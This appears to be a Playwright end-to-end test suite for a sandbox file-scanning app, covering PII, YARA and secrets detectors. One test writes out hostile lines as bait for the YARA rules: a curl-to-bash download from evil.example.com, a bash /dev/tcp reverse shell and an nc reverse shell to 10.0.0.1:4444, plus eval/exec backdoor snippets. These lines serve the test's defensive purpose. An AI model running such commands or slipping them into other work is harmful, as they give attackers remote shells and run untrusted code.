/**
 * E2E tests for the Sandbox scan workflow:
 *  1. Upload pii-sample-2.txt → PII detector → verify email/SSN/credit card findings
 *  2. Upload customers-100.csv → PII detector → verify TABLE content type + findings
 *  3. Upload sample_invoice.pdf → PII + YARA + SPAM → verify BINARY content type
 *  4. Upload clean text content → YARA detector → verify zero findings
 *  5. Delete a completed run → verify row removed from table
 *
 * Selectors use data-testid attributes only. No text/label matching.
 * Fixture files are loaded from apps/api/test/fixtures/sandbox/.
 */

import * as path from "path";
import { test, expect, type Page, type Locator } from "@playwright/test";

// ── Paths ──────────────────────────────────────────────────────────────────────

const FIXTURES_DIR = path.resolve(
  __dirname,
  "../../api/test/fixtures/sandbox",
);

const FIXTURE = {
  piiTxt: path.join(FIXTURES_DIR, "pii-sample-2.txt"),
  customersCsv: path.join(FIXTURES_DIR, "customers-100.csv"),
  invoicePdf: path.join(FIXTURES_DIR, "sample_invoice.pdf"),
} as const;

// ── Helpers ────────────────────────────────────────────────────────────────────

/**
 * Upload one or more files via the hidden file input.
 * Accepts real file paths or virtual file definitions (name + mimeType + buffer).
 */
async function uploadFiles(
  page: Page,
  files: (string | { name: string; mimeType: string; buffer: Buffer })[],
): Promise<void> {
  await page.locator('[data-testid="file-input"]').setInputFiles(
    files as Parameters<Locator["setInputFiles"]>[0],
  );

  // Verify the file list shows the uploaded items
  await expect(page.locator('[data-testid="file-list"]')).toBeVisible({
    timeout: 5_000,
  });
}

/**
 * Enable a built-in detector by its type key (e.g. "PII", "YARA", "SPAM").
 * In the current UI, detectors start in a disabled state and must first be
 * enabled via the "detector-enable-{type}" button. Once enabled, the toggle
 * appears and can be switched on if not already.
 */
async function enableDetector(page: Page, type: string): Promise<void> {
  const enableBtn = page.locator(`[data-testid="detector-enable-${type}"]`);
  if (await enableBtn.isVisible()) {
    await enableBtn.click();
  }

  const toggle = page.locator(`[data-testid="detector-toggle-${type}"]`);
  await expect(toggle).toBeVisible({ timeout: 10_000 });

  const pressed = await toggle.getAttribute("data-state");
  if (pressed !== "on") {
    await toggle.click();
  }
  await expect(toggle).toHaveAttribute("data-state", "on");
}

/**
 * Select a preset for a previously enabled detector by name.
 * The detector's edit panel must already be open (i.e. enableDetector was just called).
 */
/**
 * Select a preset for a previously enabled detector by name.
 * The detector was just enabled and its edit panel should be open.
 */
async function selectDetectorPreset(page: Page, presetName: string): Promise<void> {
  // Radix SelectTrigger renders a button with aria-haspopup="listbox"
  // The SelectValue shows the currently selected label or "Custom".
  const selectTrigger = page.locator('[data-slot="select-trigger"]').filter({ hasText: /custom|customize|anpassen/i }).first();
  await expect(selectTrigger).toBeVisible({ timeout: 5_000 });
  await selectTrigger.click();

  // Find the option by name in the popover
  const option = page.getByRole("option", { name: presetName });
  await expect(option).toBeVisible({ timeout: 5_000 });
  await option.click();
}

/**
 * Click Run, wait for redirect to /sandbox.
 */
async function runScan(page: Page): Promise<void> {
  await page.locator('[data-testid="btn-run-sandbox"]').click();
  await page.waitForURL(/\/sandbox$/, { timeout: 15_000 });
}

/**
 * Find the table row for a given filename.
 * Returns the FIRST (newest) matching row — the table defaults to CREATED_AT DESC
 * so re-runs of the same fixture file don't cause strict-mode violations.
 */
function getRunRow(page: Page, fileName: string): Locator {
  return page
    .locator('[data-testid="sandbox-run-row"]')
    .filter({ has: page.locator(`[data-testid="run-filename"]`) })
    .filter({ hasText: fileName })
    .first();
}

/**
 * Wait until a run row reaches COMPLETED or ERROR status.
 * The table polls every 2.5 s automatically; allow up to 5 minutes.
 */
async function waitForRunTerminal(
  page: Page,
  fileName: string,
): Promise<string> {
  const row = getRunRow(page, fileName);

  // First ensure the row appears
  await expect(row).toBeVisible({ timeout: 30_000 });

  const statusBadge = row.locator('[data-testid="run-status-badge"]');

  await expect(statusBadge).toHaveAttribute(
    "data-status",
    /^(COMPLETED|ERROR)$/,
    { timeout: 300_000 },
  );

  return (await statusBadge.getAttribute("data-status")) ?? "UNKNOWN";
}

/**
 * Click the row to expand findings, then return the findings detail container.
 */
async function expandRunRow(page: Page, fileName: string): Promise<Locator> {
  const row = getRunRow(page, fileName);
  await row.click();

  const detail = page.locator('[data-testid="findings-detail"]').first();
  await expect(detail).toBeVisible({ timeout: 10_000 });
  return detail;
}

// ── Test suite ─────────────────────────────────────────────────────────────────

test.describe("Sandbox Scan", () => {
  test.beforeEach(async ({ page }) => {
    await page.goto("/sandbox/new");
    await expect(page.locator('[data-testid="file-upload-area"]')).toBeVisible();
  });

  // ── 1. PII text file ────────────────────────────────────────────────────────

  test("detects PII findings from pii-sample-2.txt", async ({ page }) => {
    await uploadFiles(page, [FIXTURE.piiTxt]);
    await enableDetector(page, "PII");
    await runScan(page);

    const status = await waitForRunTerminal(page, "pii-sample-2.txt");
    expect(status, "scan must complete without error").toBe("COMPLETED");

    // Findings count badge must be > 0
    const row = getRunRow(page, "pii-sample-2.txt");
    const countBadge = row.locator('[data-testid="run-findings-count"]');
    await expect(countBadge).toBeVisible();
    const count = Number(await countBadge.getAttribute("data-count"));
    expect(count, "expected PII findings").toBeGreaterThan(0);

    // Expand row and verify PII finding rows appear
    const detail = await expandRunRow(page, "pii-sample-2.txt");
    const findingRows = detail.locator('[data-testid="finding-row"]');
    await expect(findingRows.first()).toBeVisible({ timeout: 10_000 });

    // Every visible finding must be from the PII detector
    const allRows = await findingRows.all();
    for (const findingRow of allRows) {
      await expect(findingRow).toHaveAttribute("data-detector-type", "PII");
    }

    // At least one of EMAIL_ADDRESS, US_SSN, CREDIT_CARD must appear
    const findingTypes = await Promise.all(
      allRows.map((r) => r.getAttribute("data-finding-type")),
    );
    const known = ["EMAIL_ADDRESS", "US_SSN", "CREDIT_CARD", "PHONE_NUMBER"];
    expect(
      findingTypes.some((type) => known.includes(type ?? "")),
      `None of ${known.join(", ")} found in: ${findingTypes.join(", ")}`,
    ).toBe(true);
  });

  // ── 2. CSV → TABLE content type ─────────────────────────────────────────────

  test("classifies customers-100.csv as TABLE and detects PII", async ({
    page,
  }) => {
    await uploadFiles(page, [FIXTURE.customersCsv]);
    await enableDetector(page, "PII");
    await runScan(page);

    const status = await waitForRunTerminal(page, "customers-100.csv");
    expect(status).toBe("COMPLETED");

    // Content type must be TABLE
    const row = getRunRow(page, "customers-100.csv");
    await expect(row.locator('[data-testid="run-content-type"]')).toHaveAttribute(
      "data-content-type",
      "TABLE",
    );

    // Must have PII findings
    const countBadge = row.locator('[data-testid="run-findings-count"]');
    const count = Number(await countBadge.getAttribute("data-count"));
    expect(count).toBeGreaterThan(0);
  });

  // ── 3. PDF → BINARY content type, multiple detectors ───────────────────────

  test("classifies sample_invoice.pdf as BINARY with PII+YARA+SECRETS detectors", async ({
    page,
  }) => {
    await uploadFiles(page, [FIXTURE.invoicePdf]);
    await enableDetector(page, "PII");
    await enableDetector(page, "YARA");
    await enableDetector(page, "SECRETS");
    await runScan(page);

    const status = await waitForRunTerminal(page, "sample_invoice.pdf");
    expect(status).toBe("COMPLETED");

    const row = getRunRow(page, "sample_invoice.pdf");
    await expect(row.locator('[data-testid="run-content-type"]')).toHaveAttribute(
      "data-content-type",
      "BINARY",
    );
  });

  // ── 4. YARA detection on text with injection patterns ───────────────────────

  test("detects YARA threats in file with code injection patterns", async ({
    page,
  }) => {
    const maliciousContent = [
      "Internal security audit — CONFIDENTIAL",
      "",
      'eval("var p = atob(\'bWFsaWNpb3Vz\')")',
      'exec("/tmp/backdoor.sh")',
      'system("curl http://evil.example.com/stage2 | bash")',
      "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
      "nc -e /bin/bash 10.0.0.1 4444",
    ].join("\n");

    const fileName = `yara-injection-${Date.now()}.txt`;

    await uploadFiles(page, [
      {
        name: fileName,
        mimeType: "text/plain",
        buffer: Buffer.from(maliciousContent, "utf-8"),
      },
    ]);

    await enableDetector(page, "YARA");
    // Select the "Suspicious Scripts" preset which has Potential_Code_Injection rules
    await selectDetectorPreset(page, "Suspicious Scripts");
    await runScan(page);

    const status = await waitForRunTerminal(page, fileName);
    expect(status).toBe("COMPLETED");

    const row = getRunRow(page, fileName);
    const countBadge = row.locator('[data-testid="run-findings-count"]');
    const count = Number(await countBadge.getAttribute("data-count"));
    expect(count, "expected YARA findings for injection content").toBeGreaterThan(0);

    // Expand and verify YARA findings
    const detail = await expandRunRow(page, fileName);
    const findingRows = detail.locator('[data-testid="finding-row"]');
    await expect(findingRows.first()).toBeVisible({ timeout: 10_000 });

    const allRows = await findingRows.all();
    for (const findingRow of allRows) {
      await expect(findingRow).toHaveAttribute("data-detector-type", "YARA");
    }

    // At least one known YARA rule must fire
    const findingTypes = await Promise.all(
      allRows.map((r) => r.getAttribute("data-finding-type")),
    );
    const knownRules = [
      "Potential_Code_Injection",
      "Shell_Curl_Pipe_Exec",
      "JavaScript_Eval_Obfuscation",
      "Suspicious_Shell_Escape",
    ];
    expect(
      findingTypes.some((ft) => knownRules.includes(ft ?? "")),
      `Expected one of ${knownRules.join(", ")}. Got: ${findingTypes.join(", ")}`,
    ).toBe(true);
  });

  // ── 5. Clean content → zero findings ────────────────────────────────────────

  test("produces zero findings for clean content", async ({ page }) => {
    const cleanContent = [
      "Q3 Marketing Report",
      "",
      "Product launch is scheduled for next quarter.",
      "Revenue targets are on track. No action required.",
    ].join("\n");

    const fileName = `clean-report-${Date.now()}.txt`;

    await uploadFiles(page, [
      {
        name: fileName,
        mimeType: "text/plain",
        buffer: Buffer.from(cleanContent, "utf-8"),
      },
    ]);

    await enableDetector(page, "YARA");
    await runScan(page);

    const status = await waitForRunTerminal(page, fileName);
    expect(status).toBe("COMPLETED");

    const row = getRunRow(page, fileName);
    const countBadge = row.locator('[data-testid="run-findings-count"]');
    await expect(countBadge).toBeVisible();
    expect(Number(await countBadge.getAttribute("data-count"))).toBe(0);
  });

  // ── 6. Delete a run ──────────────────────────────────────────────────────────

  test("deletes a completed run and removes it from the table", async ({
    page,
  }) => {
    const fileName = `delete-me-${Date.now()}.txt`;

    await uploadFiles(page, [
      {
        name: fileName,
        mimeType: "text/plain",
        buffer: Buffer.from("simple clean file for delete test", "utf-8"),
      },
    ]);

    await enableDetector(page, "YARA");
    await runScan(page);

    // Wait for it to finish before deleting
    await waitForRunTerminal(page, fileName);

    const row = getRunRow(page, fileName);
    await row.locator('[data-testid="btn-delete-run"]').click();

    // Row must disappear
    await expect(row).not.toBeVisible({ timeout: 10_000 });
  });
});
